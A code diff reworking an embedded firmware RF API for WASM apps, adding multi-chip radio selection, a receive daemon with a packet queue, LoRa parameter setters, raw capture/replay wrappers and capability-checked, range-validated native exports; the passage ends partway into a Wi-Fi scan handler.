@@ -1,400 +1,949 @@
 /**
  * @file akira_rf_api.c
- * @brief RF API implementation for WASM exports
+ * @brief RF API — self-contained raw-RF stack for WASM/shell access
  */
 
 #include "akira_api.h"
 #include "akira_rf_api.h"
+#include "akira_wasm_mem.h"
 #include <runtime/security.h>
 #include <zephyr/logging/log.h>
-#include "../drivers/rf/rf_framework.h"
+#include "connectivity/radio_interface.h"
+#if defined(CONFIG_AKIRA_LR2021)
+#include "../drivers/rf/lr2021.h"
+#endif
+#if defined(CONFIG_AKIRA_CC1121)
+#include "../drivers/rf/cc1121.h"
+#endif
+#if defined(CONFIG_AKIRA_LR1121)
 #include "../drivers/rf/lr1121.h"
+#endif
+#if defined(CONFIG_AKIRA_CC1101)
+#include "../drivers/rf/cc1101.h"
+#endif
+#if defined(CONFIG_AKIRA_NRF24L01)
+#include "../drivers/rf/nrf24l01.h"
+#endif
 #include <lib/mem_helper.h>
+#include <string.h>
+#include <zephyr/sys/util.h>
+#include <zephyr/sys/atomic.h>
+
+#ifdef CONFIG_WIFI
+#include <zephyr/net/net_if.h>
+#include <zephyr/net/net_mgmt.h>
+#include <zephyr/net/wifi_mgmt.h>
+#if defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32)
+#include <esp_wifi.h>
+#endif
+#endif
 
 LOG_MODULE_REGISTER(akira_rf_api, CONFIG_AKIRA_LOG_LEVEL);
 
-/* Protects g_active_chip, g_active_driver, and rf_framework_initialized.
- * RF ops may be called concurrently if two WASM apps both hold rf.transceive. */
-static K_MUTEX_DEFINE(s_rf_lock);
+/* Serializes init/select/deinit AND data-path bus ops (single operator). */
+static K_MUTEX_DEFINE(s_chip_lock);
+
+/* Cooperative daemon pause: while set, the RX daemon parks at the top of its
+ * loop and never grabs the chip lock, so a raw capture/replay can own the chip
+ * without racing it. This is a SAFE stop/start — never k_thread_suspend() the
+ * daemon, which could freeze it mid-recv while holding s_chip_lock (deadlock). */
+static atomic_t s_rf_daemon_paused = ATOMIC_INIT(0);
+
+static inline void akira_rf_daemon_pause(void)  { atomic_set(&s_rf_daemon_paused, 1); }
+static inline void akira_rf_daemon_resume(void) { atomic_set(&s_rf_daemon_paused, 0); }
+
+#define CHIP_LOCK_TIMEOUT_MS 2000
+
+/* RX queue: the daemon fills it; akira_rf_receive() drains it (decoupled from
+ * the chip). Shared, so defined here ahead of both users. */
+#define RF_RX_MAX_PACKET    255
+struct rf_rx_packet { uint8_t data[RF_RX_MAX_PACKET]; uint16_t len; };
+K_MSGQ_DEFINE(s_rf_rx_msgq, sizeof(struct rf_rx_packet),
+              CONFIG_AKIRA_RF_RX_QUEUE_DEPTH, 4);
 
 static akira_rf_chip_t g_active_chip = AKIRA_RF_CHIP_NONE;
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-static bool rf_framework_initialized = false;
-#endif /* CONFIG_AKIRA_RF_FRAMEWORK */
-static const struct akira_rf_driver *g_active_driver = NULL;
+static radio_handle_t *g_active_handle = NULL;
+/* Per-chip init tracking: init hardware once, then just swap active handle. */
+static bool s_inited[AKIRA_RF_CHIP_MAX];
 
-/* Ensure RF framework is initialized */
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-static int ensure_rf_framework(void)
+static radio_handle_t *map_chip_to_handle(akira_rf_chip_t chip)
 {
-    /* Called under s_rf_lock */
-    if (rf_framework_initialized)
-    {
-        return 0;
+    switch (chip) {
+#if defined(CONFIG_AKIRA_LR2021)
+    case AKIRA_RF_CHIP_LR2021:   return lr2021_get_handle();
+#endif
+#if defined(CONFIG_AKIRA_CC1121)
+    case AKIRA_RF_CHIP_CC1121:   return cc1121_get_handle();
+#endif
+#if defined(CONFIG_AKIRA_LR1121)
+    case AKIRA_RF_CHIP_LR1121:   return lr1121_get_handle();
+#endif
+#if defined(CONFIG_AKIRA_CC1101)
+    case AKIRA_RF_CHIP_CC1101:   return cc1101_get_handle();
+#endif
+#if defined(CONFIG_AKIRA_NRF24L01)
+    case AKIRA_RF_CHIP_NRF24L01: return nrf24l01_get_handle();
+#endif
+    default:                      return NULL;
     }
-
-    int ret = rf_framework_init();
-    if (ret < 0)
-    {
-        LOG_ERR("RF framework init failed: %d", ret);
-        return ret;
-    }
-
-    rf_framework_initialized = true;
-    return 0;
 }
-#endif /* CONFIG_AKIRA_RF_FRAMEWORK */
-
-/* Core RF API functions (no security checks) */
 
 int akira_rf_init(akira_rf_chip_t chip)
 {
     LOG_INF("RF init: chip=%d", chip);
 
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    int ret;
-
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_init: lock timed out");
-        return -EBUSY;
-    }
-
-    /* Ensure framework is initialized (under lock) */
-    ret = ensure_rf_framework();
-    if (ret < 0)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return ret;
-    }
-
-    /* Map chip enum to RF framework type */
-    rf_chip_type_t rf_type;
-    switch (chip)
-    {
-    case AKIRA_RF_CHIP_LR1121:
-        rf_type = RF_CHIP_LR1121;
-        break;
-    case AKIRA_RF_CHIP_CC1101:
-        rf_type = RF_CHIP_CC1101;
-        break;
-    case AKIRA_RF_CHIP_NRF24L01:
-        rf_type = RF_CHIP_NRF24L01;
-        break;
-    default:
+    radio_handle_t *handle = map_chip_to_handle(chip);
+    if (!handle) {
         LOG_ERR("Unsupported chip type: %d", chip);
-        k_mutex_unlock(&s_rf_lock);
         return -EINVAL;
     }
 
-    /* Get driver from framework */
-    const struct akira_rf_driver *driver = rf_framework_get_driver(rf_type);
-    if (!driver)
-    {
-        LOG_ERR("Driver not found for chip type %d", rf_type);
-        k_mutex_unlock(&s_rf_lock);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
+        return -EBUSY;
+    }
+
+    if (!handle->ops) {
+        LOG_ERR("Radio %d has no ops (stub)", chip);
+        k_mutex_unlock(&s_chip_lock);
         return -ENODEV;
     }
 
-    /* Initialize the driver */
-    ret = driver->init();
-    if (ret < 0)
-    {
-        LOG_ERR("Driver init failed: %d", ret);
-        k_mutex_unlock(&s_rf_lock);
+    int ret = 0;
+    if (handle->ops->init) {
+        ret = handle->ops->init(handle);
+    }
+    if (ret < 0) {
+        LOG_ERR("Radio '%s' init failed: %d", handle->name, ret);
+        k_mutex_unlock(&s_chip_lock);
         return ret;
     }
 
-    /* Store active driver and chip */
-    g_active_driver = driver;
+    int aret = radio_manager_acquire(handle, "rf");
+    if (aret < 0) {
+        LOG_ERR("Radio '%s' busy (owned elsewhere): %d", handle->name, aret);
+        k_mutex_unlock(&s_chip_lock);
+        return aret;
+    }
+    s_inited[chip] = true;
     g_active_chip = chip;
-    rf_framework_set_active_driver(rf_type);
+    g_active_handle = handle;
 
-    k_mutex_unlock(&s_rf_lock);
-    LOG_INF("RF driver '%s' initialized successfully", driver->name);
+    k_mutex_unlock(&s_chip_lock);
+    LOG_INF("RF radio '%s' initialized", handle->name);
     return 0;
-#else
-    (void)chip;
-    return -ENOSYS;
-#endif
 }
 
 int akira_rf_deinit(void)
 {
     LOG_INF("RF deinit");
 
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_deinit: lock timed out");
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
         return -EBUSY;
     }
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (g_active_driver && g_active_driver->deinit)
-    {
-        g_active_driver->deinit();
+
+    radio_handle_t *h = g_active_handle;
+    if (h && h->ops && h->ops->deinit) {
+        h->ops->deinit(h);
     }
-    g_active_driver = NULL;
-    rf_framework_set_active_driver(RF_CHIP_NONE);
-#endif
+    if (g_active_chip != AKIRA_RF_CHIP_NONE) {
+        s_inited[g_active_chip] = false;
+    }
+    if (g_active_handle) {
+        radio_manager_release(g_active_handle, "rf");
+        g_active_handle = NULL;
+    }
     g_active_chip = AKIRA_RF_CHIP_NONE;
-    k_mutex_unlock(&s_rf_lock);
+
+    k_mutex_unlock(&s_chip_lock);
+    return 0;
+}
+
+int akira_rf_select(akira_rf_chip_t chip)
+{
+    LOG_INF("RF select: chip=%d", chip);
+
+    if (chip == AKIRA_RF_CHIP_NONE) {
+        return -EINVAL;
+    }
+
+    radio_handle_t *handle = map_chip_to_handle(chip);
+    if (!handle) {
+        LOG_ERR("Unsupported chip type: %d", chip);
+        return -EINVAL;
+    }
+
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
+        return -EBUSY;
+    }
+
+    if (chip == g_active_chip) {
+        k_mutex_unlock(&s_chip_lock);
+        return 0;
+    }
+
+    /* Hardware-init the chip only on its first selection */
+    if (!s_inited[chip]) {
+        int ret = 0;
+        if (handle->ops && handle->ops->init) {
+            ret = handle->ops->init(handle);
+        }
+        if (ret < 0) {
+            LOG_ERR("Radio %d init failed: %d", chip, ret);
+            k_mutex_unlock(&s_chip_lock);
+            return ret;
+        }
+        s_inited[chip] = true;
+    }
+
+    if (g_active_handle && g_active_handle != handle) {
+        radio_manager_release(g_active_handle, "rf");
+        g_active_handle = NULL;
+        g_active_chip = AKIRA_RF_CHIP_NONE;
+    }
+    int aret = radio_manager_acquire(handle, "rf");
+    if (aret < 0) {
+        k_mutex_unlock(&s_chip_lock);
+        return aret;
+    }
+    g_active_handle = handle;
+    g_active_chip = chip;
+
+    k_mutex_unlock(&s_chip_lock);
+    LOG_INF("RF active radio set to chip=%d (%s)", chip, handle->name);
     return 0;
 }
 
 int akira_rf_send(const uint8_t *data, size_t len)
 {
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_send: lock timed out");
-        return -EBUSY;
-    }
-    if (g_active_chip == AKIRA_RF_CHIP_NONE || !g_active_driver)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        LOG_ERR("RF not initialized");
-        return -ENODEV;
-    }
-
-    if (!data || len == 0)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -EINVAL;
-    }
-
-    LOG_DBG("RF send: %zu bytes", len);
-
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (!g_active_driver->tx)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -ENOSYS;
-    }
-    int ret = g_active_driver->tx(data, len);
-    k_mutex_unlock(&s_rf_lock);
+    if (!data || len == 0) return -EINVAL;
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->send) ? h->ops->send(h, data, len) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
     return ret;
-#else
-    k_mutex_unlock(&s_rf_lock);
-    (void)data;
-    (void)len;
-    return -ENOSYS;
-#endif
 }
 
-int akira_rf_receive(uint8_t *buffer, size_t max_len, uint32_t timeout_ms)
+int akira_rf_receive(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
 {
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_receive: lock timed out");
-        return -EBUSY;
+    if (!buf || max_len == 0) return -EINVAL;
+    /* Pull from the daemon's RX queue rather than touching the chip directly —
+     * the daemon owns the (continuous) RX path. Avoids racing the daemon for
+     * the chip and works for both interrupt-driven and polling radios. */
+    struct rf_rx_packet pkt;
+    if (k_msgq_get(&s_rf_rx_msgq, &pkt, K_MSEC(timeout_ms)) != 0) {
+        return 0;  /* timeout, no packet */
     }
-    if (g_active_chip == AKIRA_RF_CHIP_NONE || !g_active_driver)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        LOG_ERR("RF not initialized");
-        return -ENODEV;
-    }
-
-    if (!buffer || max_len == 0)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -EINVAL;
-    }
-
-    LOG_DBG("RF receive: max=%zu, timeout=%u", max_len, timeout_ms);
-
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (!g_active_driver->rx)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -ENOSYS;
-    }
-    int ret = g_active_driver->rx(buffer, max_len, timeout_ms);
-    k_mutex_unlock(&s_rf_lock);
-    return ret;
-#else
-    k_mutex_unlock(&s_rf_lock);
-    (void)buffer;
-    (void)max_len;
-    (void)timeout_ms;
-    return -ENOSYS;
-#endif
+    size_t n = (pkt.len < max_len) ? pkt.len : max_len;
+    memcpy(buf, pkt.data, n);
+    return (int)n;
 }
 
 int akira_rf_set_frequency(uint32_t freq_hz)
 {
     LOG_INF("RF set frequency: %u Hz", freq_hz);
-
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_set_frequency: lock timed out");
-        return -EBUSY;
-    }
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (!g_active_driver || !g_active_driver->set_frequency)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -ENOSYS;
-    }
-    int ret = g_active_driver->set_frequency(freq_hz);
-    k_mutex_unlock(&s_rf_lock);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_frequency) ? h->ops->set_frequency(h, freq_hz) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
     return ret;
-#else
-    (void)freq_hz;
-    k_mutex_unlock(&s_rf_lock);
-    return -ENOSYS;
-#endif
 }
 
 int akira_rf_set_power(int8_t dbm)
 {
     LOG_INF("RF set power: %d dBm", dbm);
-
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_set_power: lock timed out");
-        return -EBUSY;
-    }
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (!g_active_driver || !g_active_driver->set_power)
-    {
-        k_mutex_unlock(&s_rf_lock);
-        return -ENOSYS;
-    }
-    int ret = g_active_driver->set_power(dbm);
-    k_mutex_unlock(&s_rf_lock);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_power) ? h->ops->set_power(h, dbm) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
     return ret;
-#else
-    (void)dbm;
-    k_mutex_unlock(&s_rf_lock);
-    return -ENOSYS;
-#endif
+}
+
+int akira_rf_set_modulation(radio_modulation_t mod)
+{
+    LOG_INF("RF set modulation: %d", mod);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_modulation) ? h->ops->set_modulation(h, mod) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
+    return ret;
+}
+
+int akira_rf_set_spreading_factor(uint8_t sf)
+{
+    LOG_INF("RF set LoRa SF: %u", sf);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_spreading_factor) ? h->ops->set_spreading_factor(h, sf) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
+    return ret;
+}
+
+int akira_rf_set_bandwidth(uint32_t bw_hz)
+{
+    LOG_INF("RF set BW: %u Hz", bw_hz);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_bandwidth) ? h->ops->set_bandwidth(h, bw_hz) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
+    return ret;
+}
+
+int akira_rf_set_coding_rate(uint8_t cr)
+{
+    LOG_INF("RF set LoRa CR: 4/%u", cr);
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret = (h && h->ops && h->ops->set_coding_rate) ? h->ops->set_coding_rate(h, cr) : -ENODEV;
+    k_mutex_unlock(&s_chip_lock);
+    return ret;
 }
 
 int akira_rf_get_rssi(int16_t *rssi)
 {
-    if (!rssi)
-    {
-        return -EINVAL;
+    if (!rssi) return -EINVAL;
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
+        *rssi = RADIO_RSSI_UNAVAILABLE; return -EBUSY;
     }
-
-    if (k_mutex_lock(&s_rf_lock, K_MSEC(2000)) != 0)
-    {
-        LOG_WRN("rf_get_rssi: lock timed out");
-        *rssi = -100;
-        return -EBUSY;
+    radio_handle_t *h = g_active_handle;
+    int ret;
+    if (h && h->ops && h->ops->get_rssi) {
+        ret = h->ops->get_rssi(h, rssi);
+        if (ret == -ENOSYS) *rssi = RADIO_RSSI_UNAVAILABLE;
+    } else {
+        *rssi = RADIO_RSSI_UNAVAILABLE; ret = -ENODEV;
     }
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    if (!g_active_driver || !g_active_driver->get_rssi)
-    {
-        *rssi = -100;
-        k_mutex_unlock(&s_rf_lock);
-        return -ENOSYS;
-    }
-    int ret = g_active_driver->get_rssi(rssi);
-    k_mutex_unlock(&s_rf_lock);
+    k_mutex_unlock(&s_chip_lock);
     return ret;
-#else
-    *rssi = -100;
-    k_mutex_unlock(&s_rf_lock);
-    return -ENOSYS;
-#endif
 }
+
+radio_handle_t *akira_rf_get_active_handle(void)
+{
+    return g_active_handle;
+}
+
+#ifdef CONFIG_AKIRA_RF_RX_DAEMON
+
+#define RF_DAEMON_SLEEP_MS  100
+
+static struct rf_rx_packet s_rf_poll_buf;
+
+static void rf_rx_daemon_fn(void *p1, void *p2, void *p3)
+{
+    ARG_UNUSED(p1); ARG_UNUSED(p2); ARG_UNUSED(p3);
+    while (1) {
+        if (!g_active_handle) { k_msleep(RF_DAEMON_SLEEP_MS); continue; }
+        radio_handle_t *h = g_active_handle;
+        if (!h || !h->ops || !h->ops->recv) { k_msleep(RF_DAEMON_SLEEP_MS); continue; }
+        if (atomic_get(&s_rf_daemon_paused)) { k_msleep(20); continue; }
+
+        int n;
+        if (h->ops->rx_wait) {
+            /* Interrupt-driven continuous RX. recv() (under the lock, briefly)
+             * arms continuous RX on first call and reads any pending packet
+             * non-blocking. rx_wait() then blocks LOCK-FREE on the IRQ until the
+             * next packet — the chip never leaves RX (no gap) and the lock is
+             * free while idle (no starvation). */
+            if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
+                k_msleep(RF_DAEMON_SLEEP_MS); continue;
+            }
+            n = h->ops->recv(h, s_rf_poll_buf.data, RF_RX_MAX_PACKET, 0);
+            k_mutex_unlock(&s_chip_lock);
+            if (n <= 0) { h->ops->rx_wait(h, 1000); continue; }  /* wait next IRQ */
+        } else {
+            /* Polling radios: short window so the lock is released frequently. */
+            if (k_mutex_lock(&s_chip_lock, K_NO_WAIT) != 0) {
+                k_msleep(RF_DAEMON_SLEEP_MS); continue;
+            }
+            n = h->ops->recv(h, s_rf_poll_buf.data, RF_RX_MAX_PACKET, 2000);
+            k_mutex_unlock(&s_chip_lock);
+            if (n <= 0) { k_msleep(RF_DAEMON_SLEEP_MS); continue; }
+        }
+        LOG_INF("RF RX %d bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
+                n,
+                n > 0 ? s_rf_poll_buf.data[0] : 0, n > 1 ? s_rf_poll_buf.data[1] : 0,
+                n > 2 ? s_rf_poll_buf.data[2] : 0, n > 3 ? s_rf_poll_buf.data[3] : 0,
+                n > 4 ? s_rf_poll_buf.data[4] : 0, n > 5 ? s_rf_poll_buf.data[5] : 0,
+                n > 6 ? s_rf_poll_buf.data[6] : 0, n > 7 ? s_rf_poll_buf.data[7] : 0);
+        s_rf_poll_buf.len = (uint16_t)n;
+        if (k_msgq_put(&s_rf_rx_msgq, &s_rf_poll_buf, K_NO_WAIT) == -ENOMSG) {
+            struct rf_rx_packet discard;
+            k_msgq_get(&s_rf_rx_msgq, &discard, K_NO_WAIT);
+            k_msgq_put(&s_rf_rx_msgq, &s_rf_poll_buf, K_NO_WAIT);
+        }
+    }
+}
+
+K_THREAD_DEFINE(rf_rx_daemon, CONFIG_AKIRA_RF_DAEMON_STACK_SIZE,
+                rf_rx_daemon_fn, NULL, NULL, NULL,
+                CONFIG_AKIRA_RF_DAEMON_PRIORITY, 0, 0);
+
+/* Stateless raw capture: pause the daemon, take the chip, stream into buf.
+ * The lock timeout exceeds the daemon's one in-flight 2 s recv so we never
+ * spuriously fail to acquire. */
+int akira_rf_raw_capture(uint8_t *buf, size_t max_bytes,
+                         uint32_t sample_rate_hz, uint32_t timeout_ms)
+{
+    radio_handle_t *h = g_active_handle;
+    if (!h || !h->ops || !h->ops->raw_capture) return -ENOSYS;
+    if (!(h->capabilities & RADIO_CAP_RAW_MODE)) return -ENOTSUP;
+
+    akira_rf_daemon_pause();
+    int ret = -EBUSY;
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(5000)) == 0) {
+        ret = h->ops->raw_capture(h, buf, max_bytes, sample_rate_hz, timeout_ms);
+        k_mutex_unlock(&s_chip_lock);
+    }
+    akira_rf_daemon_resume();
+    return ret;
+}
+
+int akira_rf_raw_replay(const uint8_t *buf, size_t len,
+                        uint32_t sample_rate_hz, uint32_t repeat)
+{
+    radio_handle_t *h = g_active_handle;
+    if (!h || !h->ops || !h->ops->raw_replay) return -ENOSYS;
+    if (!(h->capabilities & RADIO_CAP_RAW_MODE)) return -ENOTSUP;
+
+    akira_rf_daemon_pause();
+    int ret = -EBUSY;
+    if (k_mutex_lock(&s_chip_lock, K_MSEC(5000)) == 0) {
+        ret = h->ops->raw_replay(h, buf, len, sample_rate_hz, repeat);
+        k_mutex_unlock(&s_chip_lock);
+    }
+    akira_rf_daemon_resume();
+    return ret;
+}
+
+int akira_rf_recv_pop(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
+{
+    if (!buf || max_len == 0) return -EINVAL;
+    struct rf_rx_packet pkt;
+    k_timeout_t t = (timeout_ms == 0) ? K_NO_WAIT : K_MSEC(timeout_ms);
+    int ret = k_msgq_get(&s_rf_rx_msgq, &pkt, t);
+    if (ret < 0) return ret;
+    size_t copy = MIN(pkt.len, max_len);
+    memcpy(buf, pkt.data, copy);
+    return (int)copy;
+}
+
+#else
+int akira_rf_recv_pop(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
+{
+    ARG_UNUSED(buf); ARG_UNUSED(max_len); ARG_UNUSED(timeout_ms);
+    return -ENOSYS;
+}
+#endif /* CONFIG_AKIRA_RF_RX_DAEMON */
 
 #ifdef CONFIG_AKIRA_WASM_RUNTIME
 
 /* WASM Native export API */
 
-int akira_native_rf_send(wasm_exec_env_t exec_env, uint32_t payload_ptr, uint32_t len)
+int akira_native_rf_select(wasm_exec_env_t exec_env, int chip)
 {
-    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
-    if (!module_inst)
-        return -1;
-
     AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
-
-    if (len == 0)
-        return -1;
-
-    uint8_t *ptr = (uint8_t *)wasm_runtime_addr_app_to_native(module_inst, payload_ptr);
-    if (!ptr)
-        return -1;
-
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    /* The API layer will dispatch to the proper radio driver */
-    return akira_rf_send(ptr, len);
-#else
-    (void)ptr;
-    (void)len;
-    return -ENOSYS;
-#endif
+    return akira_rf_select((akira_rf_chip_t)chip);
 }
 
-int akira_native_rf_receive(wasm_exec_env_t exec_env, uint32_t buffer_ptr, uint32_t max_len, uint32_t timeout_ms)
+int akira_native_rf_recv_pop(wasm_exec_env_t exec_env, uint32_t buf_ptr,
+                             uint32_t max_len, uint32_t timeout_ms)
 {
-    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
-    if (!module_inst)
-        return -1;
-
     AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
 
     if (max_len == 0)
-        return -1;
+        return -EINVAL;
 
-    uint8_t *ptr = (uint8_t *)wasm_runtime_addr_app_to_native(module_inst, buffer_ptr);
+    /* Validate the whole [buf_ptr, buf_ptr+max_len) range, not just the base. */
+    uint8_t *buf = (uint8_t *)akira_wasm_ptr_to_native(exec_env, buf_ptr, max_len);
+    if (!buf)
+        return -EFAULT;
+
+    return akira_rf_recv_pop(buf, (size_t)max_len, timeout_ms);
+}
+
+int akira_native_rf_send(wasm_exec_env_t exec_env, uint32_t payload_ptr, uint32_t len)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+
+    if (len == 0)
+        return -EINVAL;
+
+    /* payload_ptr is a raw app offset (signature "(ii)i"); validate base+len. */
+    uint8_t *ptr = (uint8_t *)akira_wasm_ptr_to_native(exec_env, payload_ptr, len);
     if (!ptr)
-        return -1;
+        return -EFAULT;
 
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
-    /* The API layer will dispatch to the proper radio driver */
+    return akira_rf_send(ptr, len);
+}
+
+int akira_native_rf_receive(wasm_exec_env_t exec_env, uint32_t buffer_ptr,
+                             uint32_t max_len, uint32_t timeout_ms)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+
+    if (max_len == 0)
+        return -EINVAL;
+
+    /* Validate the whole [buffer_ptr, buffer_ptr+max_len) range, not just the base. */
+    uint8_t *ptr = (uint8_t *)akira_wasm_ptr_to_native(exec_env, buffer_ptr, max_len);
+    if (!ptr)
+        return -EFAULT;
+
     return akira_rf_receive(ptr, max_len, timeout_ms);
-#else
-    (void)ptr;
-    (void)max_len;
-    (void)timeout_ms;
-    return -ENOSYS;
-#endif
 }
 
 int akira_native_rf_set_frequency(wasm_exec_env_t exec_env, uint32_t freq_hz)
 {
-
     AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
-
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
     return akira_rf_set_frequency(freq_hz);
-#else
-    (void)freq_hz;
-    return -ENOSYS;
-#endif
+}
+
+int akira_native_rf_set_modulation(wasm_exec_env_t exec_env, int mod)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+    return akira_rf_set_modulation((radio_modulation_t)mod);
+}
+
+int akira_native_rf_set_spreading_factor(wasm_exec_env_t exec_env, int sf)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+    if (sf < 6 || sf > 12) return -EINVAL;
+    return akira_rf_set_spreading_factor((uint8_t)sf);
+}
+
+int akira_native_rf_set_bandwidth(wasm_exec_env_t exec_env, uint32_t bw_hz)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+    return akira_rf_set_bandwidth(bw_hz);
+}
+
+int akira_native_rf_set_coding_rate(wasm_exec_env_t exec_env, int cr)
+{
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+    if (cr < 5 || cr > 8) return -EINVAL;
+    return akira_rf_set_coding_rate((uint8_t)cr);
 }
 
 int akira_native_rf_get_rssi(wasm_exec_env_t exec_env)
 {
     AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
-
-#ifdef CONFIG_AKIRA_RF_FRAMEWORK
     int16_t rssi = 0;
     int ret = akira_rf_get_rssi(&rssi);
     if (ret < 0) {
         return ret;
     }
     return (int32_t)rssi;
-#else
-    return -ENOSYS;
-#endif
 }
 
 int akira_native_rf_set_power(wasm_exec_env_t exec_env, int8_t dbm)
 {
+    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
+    return akira_rf_set_power(dbm);
+}
+
+#if defined(CONFIG_WIFI) && defined(CONFIG_AKIRA_RF_FRAMEWORK)
+
+/* ── Spectrum scan (per-channel max RSSI) ────────────────────────────── */
+#define WIFI_SCAN_MAX_CHANNELS 14
+#define WIFI_SCAN_TIMEOUT_MS   5000
+
+struct wifi_scan_ctx {
+    int8_t  rssi[WIFI_SCAN_MAX_CHANNELS];
+    uint8_t seen[WIFI_SCAN_MAX_CHANNELS];
+    struct k_sem done;
+};
+
+static struct wifi_scan_ctx g_wifi_scan_ctx;
+static struct net_mgmt_event_callback g_wifi_scan_cb;
+static bool g_wifi_scan_cb_reg;
+
+static void wifi_scan_event_handler(struct net_mgmt_event_callback *cb,
+                                     uint64_t event, struct net_if *iface)
+{
+    ARG_UNUSED(cb);
+    ARG_UNUSED(iface);
+
+    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
+        const struct wifi_scan_result *entry =
+            (const struct wifi_scan_result *)cb->info;
+        if (entry && entry->channel >= 1 &&
+            entry->channel <= WIFI_SCAN_MAX_CHANNELS) {
+            int ch = entry->channel - 1;
+            if (!g_wifi_scan_ctx.seen[ch] ||
+                entry->rssi > g_wifi_scan_ctx.rssi[ch]) {
